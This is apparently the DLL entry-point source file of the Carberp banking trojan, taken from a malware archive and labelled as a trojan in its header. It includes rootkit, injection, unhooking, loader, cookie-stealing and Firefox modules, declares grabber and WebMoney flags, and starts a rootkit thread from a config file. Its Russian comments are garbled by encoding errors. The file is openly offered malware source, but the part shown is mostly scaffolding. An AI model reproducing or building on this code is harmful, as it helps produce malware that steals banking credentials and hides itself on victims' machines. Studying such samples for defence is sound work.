/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
// dllmain.cpp: ���������� ����� ����� ��� ���������� DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"
#include "BotConfig.h"

#include "Crypt.h"

#include "Modules.h"

#include "ntdll.h"

#include "coocksol.h"

#include "Firefox.h"

#include "md5.h"

//#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  ������� ���������� �����
//------------------------------------------------------------------------------

#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
DWORD dwWebMoneySelf = 0;

//DWORD dwExplorerPid  = 0; //��� ����������




extern"C"  void WINAPI Start()
{
	BOT::Initialize();
	string Msg;
	Msg.Format("1.12 ������������ ����� � �������� [PID:%d] %s", Bot->PID(), Bot->ApplicationName().t_str()); 

	//pMessageBoxA(NULL, Msg.t_str(), NULL, 0); 
	
//	IfobsOnline::Initialize(); 

//	return;
 
     
	 
	Config::SetFileName("c:\\config\\config.bin");  
	    
	RootkitThread(NULL); 

	while (1) pSleep(100000);    
}



